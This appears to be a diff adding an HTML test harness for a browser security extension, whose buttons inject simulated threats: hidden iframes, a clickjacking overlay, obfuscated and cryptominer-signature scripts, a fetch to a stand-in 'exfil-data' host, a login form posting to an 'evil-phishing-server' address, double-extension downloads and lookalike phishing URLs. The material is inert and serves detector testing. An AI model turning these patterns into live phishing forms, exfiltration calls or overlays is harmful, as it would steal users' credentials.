@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OctoPlamTree — Extension Test Harness</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+    :root {
+      --bg: #0a0e17;
+      --bg-card: #111827;
+      --border: #1e293b;
+      --text: #e2e8f0;
+      --text-dim: #94a3b8;
+      --accent: #6366f1;
+      --green: #10b981;
+      --red: #ef4444;
+      --amber: #f59e0b;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', system-ui, sans-serif;
+      max-width: 960px;
+      margin: 0 auto;
+      padding: 30px 20px 60px;
+    }
+    header {
+      text-align: center;
+      padding-bottom: 28px;
+      margin-bottom: 30px;
+      border-bottom: 1px solid var(--border);
+    }
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #6366f1, #10b981);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 8px;
+    }
+    .subtitle { color: var(--text-dim); font-size: 13px; line-height: 1.6; max-width: 650px; margin: 0 auto; }
+    .steps-banner {
+      background: rgba(99, 102, 241, 0.08);
+      border: 1px solid rgba(99, 102, 241, 0.25);
+      border-radius: 10px;
+      padding: 16px 20px;
+      margin-bottom: 28px;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+    .steps-banner strong { color: var(--accent); }
+    .steps-banner ol { padding-left: 18px; }
+    .steps-banner code {
+      background: rgba(99, 102, 241, 0.15);
+      padding: 1px 5px;
+      border-radius: 4px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+    }
+    .section-label {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
+      color: var(--text-dim);
+      font-weight: 600;
+      margin-bottom: 14px;
+      padding-left: 2px;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 18px;
+      margin-bottom: 28px;
+    }
+    .panel {
+      background-color: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      transition: border-color 0.3s;
+    }
+    .panel:hover { border-color: rgba(99, 102, 241, 0.35); }
+    .panel-title {
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #f1f5f9;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .panel-title .emoji { font-size: 18px; }
+    .panel-desc {
+      font-size: 12px;
+      color: var(--text-dim);
+      margin-bottom: 14px;
+      line-height: 1.5;
+    }
+    .btn {
+      background-color: rgba(99, 102, 241, 0.12);
+      color: #c7d2fe;
+      border: 1px solid rgba(99, 102, 241, 0.3);
+      padding: 7px 13px;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      margin-right: 5px;
+      margin-bottom: 6px;
+      font-family: 'Inter', sans-serif;
+    }
+    .btn:hover { background-color: rgba(99, 102, 241, 0.22); border-color: var(--accent); transform: translateY(-1px); }
+    .btn:active { transform: translateY(0); }
+    .btn-danger {
+      background-color: rgba(239, 68, 68, 0.1);
+      border-color: rgba(239, 68, 68, 0.3);
+      color: #fca5a5;
+    }
+    .btn-danger:hover { background-color: rgba(239, 68, 68, 0.2); border-color: var(--red); }
+    .btn-green {
+      background-color: rgba(16, 185, 129, 0.1);
+      border-color: rgba(16, 185, 129, 0.3);
+      color: #6ee7b7;
+    }
+    .btn-green:hover { background-color: rgba(16, 185, 129, 0.2); border-color: var(--green); }
+    .console {
+      background-color: #020617;
+      border: 1px solid var(--border);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      padding: 10px 12px;
+      border-radius: 8px;
+      height: 100px;
+      overflow-y: auto;
+      color: #38bdf8;
+      margin-top: 10px;
+    }
+    .console-line { margin-bottom: 3px; word-break: break-all; }
+    .console-line.ok { color: var(--green); }
+    .console-line.warn { color: var(--amber); }
+    .console-line.err { color: var(--red); }
+    input[type="text"] {
+      width: 100%;
+      padding: 8px 10px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      background-color: #0f172a;
+      color: white;
+      margin-bottom: 10px;
+      font-size: 12px;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    input[type="text"]:focus { outline: none; border-color: var(--accent); }
+    .status-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #111827;
+      border-top: 1px solid var(--border);
+      padding: 10px 20px;
+      font-size: 11px;
+      color: var(--text-dim);
+      display: flex;
+      justify-content: space-between;
+      z-index: 100;
+    }
+    .status-bar .live-dot {
+      display: inline-block;
+      width: 6px; height: 6px;
+      background: var(--green);
+      border-radius: 50%;
+      margin-right: 6px;
+      animation: blink 1.5s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    .full-width { grid-column: 1 / -1; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>🐙 OctoPlamTree Test Harness</h1>
+    <p class="subtitle">Interactive threat simulation dashboard. Trigger each module below and verify alerts appear in the extension popup.</p>
+  </header>
+
+  <div class="steps-banner">
+    <strong>Setup Instructions:</strong>
+    <ol>
+      <li>Open <code>chrome://extensions</code> → enable <strong>Developer Mode</strong></li>
+      <li>Click <strong>"Load unpacked"</strong> → select the <code>browser-extension/</code> folder</li>
+      <li>Pin the OctoPlamTree icon in the toolbar</li>
+      <li>Open this test page and use the buttons below</li>
+      <li>Click the extension icon to see detected threats in real-time</li>
+    </ol>
+  </div>
+
+  <div class="section-label">Threat Detection Modules</div>
+
+  <div class="grid">
+
+    <!-- 1. DOM THREAT DETECTOR -->
+    <div class="panel">
+      <div class="panel-title"><span class="emoji">🔲</span> DOM & Clickjacking</div>
+      <div class="panel-desc">Inject hidden iframes and transparent overlays to test the MutationObserver-based real-time DOM scanner.</div>
+      <button id="btn-inject-iframes" class="btn">Inject 4 Hidden Iframes</button>
+      <button id="btn-inject-overlay" class="btn">Inject Clickjack Overlay</button>
+      <button id="btn-clean-dom" class="btn btn-green">Reset DOM</button>
+      <div id="dom-console" class="console">
+        <div class="console-line">Ready — inject threats to test...</div>
+      </div>
+    </div>
+
+    <!-- 2. SCRIPT ANALYSIS -->
+    <div class="panel">
+      <div class="panel-title"><span class="emoji">📜</span> Script Analysis</div>
+      <div class="panel-desc">Execute scripts with suspicious signatures (cryptominer keywords, obfuscated code with eval/atob) to test the script scanner.</div>
+      <button id="btn-run-obfuscated" class="btn">Inject Obfuscated Script (11KB)</button>
+      <button id="btn-run-miner" class="btn">Inject Cryptominer Signature</button>
+      <div id="script-console" class="console">
+        <div class="console-line">Ready — inject scripts to test...</div>
+      </div>
+    </div>
+
+    <!-- 3. COOKIE & SESSION -->
+    <div class="panel">
+      <div class="panel-title"><span class="emoji">🍪</span> Cookie & Session Monitor</div>
+      <div class="panel-desc">Write and read sensitive auth cookies. The extension's inject.js hooks document.cookie to detect credential access.</div>
+      <button id="btn-write-auth-cookie" class="btn">Write auth_token Cookie</button>
+      <button id="btn-write-session-cookie" class="btn">Write session_id Cookie</button>
+      <button id="btn-read-cookies" class="btn">Read All Cookies</button>
+      <div id="cookie-console" class="console">
+        <div class="console-line">Ready — interact with cookies to test...</div>
+      </div>
+    </div>
+
+    <!-- 4. API INTERCEPTION -->
+    <div class="panel">
+      <div class="panel-title"><span class="emoji">📡</span> Network Interception</div>
+      <div class="panel-desc">Generate fetch, XHR, and WebSocket requests. The extension hooks all 3 APIs and logs each connection to the Network tab.</div>
+      <button id="btn-test-fetch" class="btn">Fetch API Request</button>
+      <button id="btn-test-xhr" class="btn">XMLHttpRequest</button>
+      <button id="btn-test-websocket" class="btn">WebSocket</button>
+      <button id="btn-trigger-blocked-conn" class="btn btn-danger">Blocked Domain Request</button>
+      <div id="api-console" class="console">
+        <div class="console-line">Ready — fire network requests to test...</div>
+      </div>
+    </div>
+
+    <!-- 5. FAKE LOGIN FORM -->
+    <div class="panel">
+      <div class="panel-title"><span class="emoji">🎣</span> Fake Login Form Detection</div>
+      <div class="panel-desc">Inject a login form that submits to an external domain. The DOM scanner detects cross-domain credential exfiltration forms.</div>
+      <button id="btn-inject-login-form" class="btn btn-danger">Inject Fake Login Form</button>
+      <button id="btn-inject-password-only" class="btn">Inject Password Field</button>
+      <button id="btn-clean-forms" class="btn btn-green">Remove Forms</button>
+      <div id="form-console" class="console">
+        <div class="console-line">Ready — inject forms to test...</div>
+      </div>
+    </div>
+
+    <!-- 6. DOWNLOAD SCANNER -->
+    <div class="panel">
+      <div class="panel-title"><span class="emoji">💾</span> Download Scanner</div>
+      <div class="panel-desc">Trigger file downloads with dangerous extensions. The extension scans every download for executable and double-extension attacks.</div>
+      <button id="btn-download-exe" class="btn">Download .exe File</button>
+      <button id="btn-download-double" class="btn">Download .pdf.exe (Double-Ext)</button>
+      <button id="btn-download-bat" class="btn">Download .bat File</button>
+      <div id="download-console" class="console">
+        <div class="console-line">Ready — trigger downloads to test...</div>
+      </div>
+    </div>
+
+    <!-- 7. URL ANALYSIS -->
+    <div class="panel full-width">
+      <div class="panel-title"><span class="emoji">🔗</span> URL Analyzer (Manual Test)</div>
+      <div class="panel-desc">Enter a URL below. The extension's background worker scans every navigated URL automatically. You can also type these into the address bar to see the extension respond in real-time.</div>
+      <input type="text" id="sim-url" value="http://paypa1-secure-login.com/verify-account" placeholder="Enter a URL to test...">
+      <div style="margin-bottom: 10px;">
+        <button id="btn-nav-url" class="btn btn-danger">Navigate to URL (Triggers Self-Healing)</button>
+        <button id="btn-copy-url" class="btn">Copy to Clipboard</button>
+      </div>
+      <div class="panel-desc" style="margin-bottom: 6px;">
+        <strong style="color: var(--text);">Try these URLs</strong> (paste into address bar):
+      </div>
+      <div style="display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px;">
+        <button class="btn sample-url" data-url="http://paypa1-secure-login.com/verify">paypa1-secure-login.com</button>
+        <button class="btn sample-url" data-url="http://g00gle-account-verify.tk/login">g00gle-account-verify.tk</button>
+        <button class="btn sample-url" data-url="http://microsoft-billing-update.xyz/reset">microsoft-billing.xyz</button>
+        <button class="btn sample-url" data-url="http://192.168.1.100/admin/login">Raw IP Login</button>
+        <button class="btn sample-url" data-url="http://xn--pypal-4ve.com/signin">Punycode Attack</button>
+        <button class="btn sample-url" data-url="http://a.b.c.d.e.suspicious-routing.com">Deep Subdomains</button>
+      </div>
+      <div id="url-console" class="console">
+        <div class="console-line">Select a sample URL or enter your own...</div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="status-bar">
+    <span><span class="live-dot"></span>Extension test harness active</span>
+    <span>Open the extension popup to view detected threats →</span>
+  </div>
+
+  <script>
+    // --- Console Log Helper ---
+    function logTo(consoleId, msg, cls = "") {
+      const c = document.getElementById(consoleId);
+      const line = document.createElement("div");
+      line.className = "console-line " + cls;
+      line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+      c.appendChild(line);
+      c.scrollTop = c.scrollHeight;
+    }
+
+    // ================================
+    // 1. DOM & CLICKJACKING
+    // ================================
+    let injectedElements = [];
+
+    document.getElementById("btn-inject-iframes").addEventListener("click", () => {
+      for (let i = 0; i < 4; i++) {
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = "about:blank";
+        document.body.appendChild(iframe);
+        injectedElements.push(iframe);
+      }
+      logTo("dom-console", "✓ Injected 4 invisible iframes into DOM", "ok");
+      logTo("dom-console", "→ Extension should detect: 'Hidden Iframe Detected'", "warn");
+    });
+
+    document.getElementById("btn-inject-overlay").addEventListener("click", () => {
+      const div = document.createElement("div");
+      div.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;opacity:0.05;background:white;";
+      div.id = "octo-test-overlay";
+      document.body.appendChild(div);
+      injectedElements.push(div);
+      logTo("dom-console", "✓ Injected clickjacking overlay (z:99999, opacity:0.05)", "ok");
+      logTo("dom-console", "→ Extension should detect: 'Clickjacking Overlay'", "warn");
+    });
+
+    document.getElementById("btn-clean-dom").addEventListener("click", () => {
+      injectedElements.forEach(el => el.remove());
+      injectedElements = [];
+      logTo("dom-console", "✓ Cleaned up all injected test elements", "ok");
+    });
+
+    // ================================
+    // 2. SCRIPT ANALYSIS
+    // ================================
+    document.getElementById("btn-run-obfuscated").addEventListener("click", () => {
+      logTo("script-console", "Creating large obfuscated script...");
+      const script = document.createElement("script");
+      let body = "// Obfuscated script test\n";
+      body += "var _x = eval;\n";
+      body += "var _y = String.fromCharCode;\n";
+      for (let i = 0; i < 500; i++) {
+        body += `var _v${i} = "${Math.random().toString(36).substring(2)}";\n`;
+      }
+      script.textContent = body;
+      document.body.appendChild(script);
+      logTo("script-console", `✓ Injected script (${body.length} chars) with eval + String.fromCharCode`, "ok");
+      logTo("script-console", "→ Extension should detect: 'Obfuscated Javascript'", "warn");
+    });
+
+    document.getElementById("btn-run-miner").addEventListener("click", () => {
+      const script = document.createElement("script");
+      script.textContent = `
+        // Cryptominer simulation
+        var CoinHive_Anonymous = "CoinHive.Anonymous";
+        var _miner = { start: function() {} };
+        _miner.start();
+      `;
+      document.body.appendChild(script);
+      logTo("script-console", "✓ Injected script with CoinHive.Anonymous signature", "ok");
+      logTo("script-console", "→ Extension should detect: 'Cryptominer Script'", "warn");
+    });
+
+    // ================================
+    // 3. COOKIE & SESSION
+    // ================================
+    document.getElementById("btn-write-auth-cookie").addEventListener("click", () => {
+      const val = `oauth_token=${Math.random().toString(36).substring(2)}; path=/`;
+      document.cookie = val;
+      logTo("cookie-console", `✓ Wrote: ${val}`, "ok");
+      logTo("cookie-console", "→ Extension should detect: 'Sensitive Cookie Read/Write'", "warn");
+    });
+
+    document.getElementById("btn-write-session-cookie").addEventListener("click", () => {
+      const val = `session_id=sess_${Date.now()}; path=/`;
+      document.cookie = val;
+      logTo("cookie-console", `✓ Wrote: ${val}`, "ok");
+      logTo("cookie-console", "→ Extension should detect: 'Sensitive Cookie Read/Write'", "warn");
+    });
+
+    document.getElementById("btn-read-cookies").addEventListener("click", () => {
+      const cookies = document.cookie;
+      logTo("cookie-console", `Read cookies: ${cookies || "(empty)"}`, "ok");
+    });
+
+    // ================================
+    // 4. NETWORK INTERCEPTION
+    // ================================
+    document.getElementById("btn-test-fetch").addEventListener("click", () => {
+      logTo("api-console", "Sending fetch()...");
+      fetch("https://jsonplaceholder.typicode.com/todos/1")
+        .then(res => res.json())
+        .then(data => logTo("api-console", `✓ Fetch OK: "${data.title}"`, "ok"))
+        .catch(err => logTo("api-console", `✗ Fetch error: ${err.message}`, "err"));
+    });
+
+    document.getElementById("btn-test-xhr").addEventListener("click", () => {
+      logTo("api-console", "Sending XMLHttpRequest...");
+      const xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://jsonplaceholder.typicode.com/posts/1");
+      xhr.onload = () => logTo("api-console", `✓ XHR OK: status ${xhr.status}`, "ok");
+      xhr.onerror = () => logTo("api-console", "✗ XHR error", "err");
+      xhr.send();
+    });
+
+    document.getElementById("btn-test-websocket").addEventListener("click", () => {
+      logTo("api-console", "Opening WebSocket...");
+      try {
+        const ws = new WebSocket("wss://echo.websocket.events");
+        ws.onopen = () => {
+          logTo("api-console", "✓ WebSocket connected", "ok");
+          ws.send("OctoPlamTree test ping");
+        };
+        ws.onmessage = (e) => {
+          logTo("api-console", `✓ WebSocket echo: "${e.data}"`, "ok");
+          ws.close();
+        };
+        ws.onerror = () => logTo("api-console", "WebSocket connection failed (server may be down)", "warn");
+      } catch (e) {
+        logTo("api-console", `✗ WS error: ${e.message}`, "err");
+      }
+    });
+
+    document.getElementById("btn-trigger-blocked-conn").addEventListener("click", () => {
+      logTo("api-console", "Sending fetch to blacklisted domain...");
+      fetch("https://malicious-api-example.com/exfil-data")
+        .then(() => logTo("api-console", "Request went through (domain not blocked at network level)", "warn"))
+        .catch(() => logTo("api-console", "✓ Request failed (expected — check extension for 'Blocked Connection' alert)", "ok"));
+    });
+
+    // ================================
+    // 5. FAKE LOGIN FORM
+    // ================================
+    let injectedForms = [];
+
+    document.getElementById("btn-inject-login-form").addEventListener("click", () => {
+      const form = document.createElement("form");
+      form.action = "https://evil-phishing-server.com/steal";
+      form.method = "POST";
+      form.id = "octo-test-form";
+      form.style.cssText = "background:#1e293b;padding:16px;border-radius:8px;max-width:300px;margin:16px 0;border:1px solid #334155;";
+      form.innerHTML = `
+        <div style="color:#e2e8f0;font-size:13px;margin-bottom:10px;font-weight:600;">Fake Login Form (Test)</div>
+        <input type="email" name="email" placeholder="Email" style="width:100%;padding:6px;margin-bottom:8px;background:#0f172a;border:1px solid #334155;color:white;border-radius:4px;">
+        <input type="password" name="pass" placeholder="Password" style="width:100%;padding:6px;margin-bottom:8px;background:#0f172a;border:1px solid #334155;color:white;border-radius:4px;">
+        <div style="font-size:10px;color:#ef4444;margin-top:4px;">⚠ Form submits to: evil-phishing-server.com</div>
+      `;
+      form.onsubmit = (e) => e.preventDefault();
+      document.getElementById("form-console").before(form);
+      injectedForms.push(form);
+      logTo("form-console", "✓ Injected form with action=evil-phishing-server.com + password field", "ok");
+      logTo("form-console", "→ Extension should detect: 'Credential Exfiltration Form'", "warn");
+    });
+
+    document.getElementById("btn-inject-password-only").addEventListener("click", () => {
+      const div = document.createElement("div");
+      div.id = "octo-test-pw";
+      div.style.cssText = "background:#1e293b;padding:12px;border-radius:8px;max-width:300px;margin:10px 0;border:1px solid #334155;";
+      div.innerHTML = `
+        <div style="color:#e2e8f0;font-size:12px;margin-bottom:8px;">Password Input (No Form)</div>
+        <input type="password" placeholder="Enter password" style="width:100%;padding:6px;background:#0f172a;border:1px solid #334155;color:white;border-radius:4px;">
+      `;
+      document.getElementById("form-console").before(div);
+      injectedForms.push(div);
+      logTo("form-console", "✓ Injected standalone password input field", "ok");
+      logTo("form-console", "→ If on HTTP: Extension should detect 'Insecure Login Form'", "warn");
+    });
+
+    document.getElementById("btn-clean-forms").addEventListener("click", () => {
+      injectedForms.forEach(el => el.remove());
+      injectedForms = [];
+      logTo("form-console", "✓ Removed all injected forms", "ok");
+    });
+
+    // ================================
+    // 6. DOWNLOAD SCANNER
+    // ================================
+    function triggerDownload(filename) {
+      const a = document.createElement("a");
+      a.href = "data:text/plain,OctoPlamTree-test-file";
+      a.download = filename;
+      a.click();
+    }
+
+    document.getElementById("btn-download-exe").addEventListener("click", () => {
+      triggerDownload("security_patch.exe");
+      logTo("download-console", "✓ Triggered download: security_patch.exe", "ok");
+      logTo("download-console", "→ Extension should detect: 'Malicious Download' (.exe)", "warn");
+    });
+
+    document.getElementById("btn-download-double").addEventListener("click", () => {
+      triggerDownload("invoice_report.pdf.exe");
+      logTo("download-console", "✓ Triggered download: invoice_report.pdf.exe", "ok");
+      logTo("download-console", "→ Extension should detect: 'Malicious Download' (double-extension)", "warn");
+    });
+
+    document.getElementById("btn-download-bat").addEventListener("click", () => {
+      triggerDownload("setup_script.bat");
+      logTo("download-console", "✓ Triggered download: setup_script.bat", "ok");
+      logTo("download-console", "→ Extension should detect: 'Malicious Download' (.bat)", "warn");
+    });
+
+    // ================================
+    // 7. URL ANALYZER
+    // ================================
+    document.querySelectorAll(".sample-url").forEach(btn => {
+      btn.addEventListener("click", () => {
+        document.getElementById("sim-url").value = btn.dataset.url;
+        logTo("url-console", `Selected: ${btn.dataset.url}`, "ok");
+      });
+    });
+
+    document.getElementById("btn-nav-url").addEventListener("click", () => {
+      const url = document.getElementById("sim-url").value;
+      if (!url) return;
+      logTo("url-console", `Navigating to: ${url}`, "warn");
+      logTo("url-console", "→ Extension will analyze and may quarantine this tab", "warn");
+      setTimeout(() => { window.location.href = url; }, 500);
+    });
+
+    document.getElementById("btn-copy-url").addEventListener("click", () => {
+      const url = document.getElementById("sim-url").value;
+      navigator.clipboard.writeText(url).then(() => {
+        logTo("url-console", `✓ Copied to clipboard: ${url}`, "ok");
+        logTo("url-console", "Paste into the address bar and press Enter to test", "");
+      }).catch(() => {
+        logTo("url-console", "✗ Clipboard access denied — copy manually", "err");
+      });
+    });
+  </script>
+</body>
+</html>
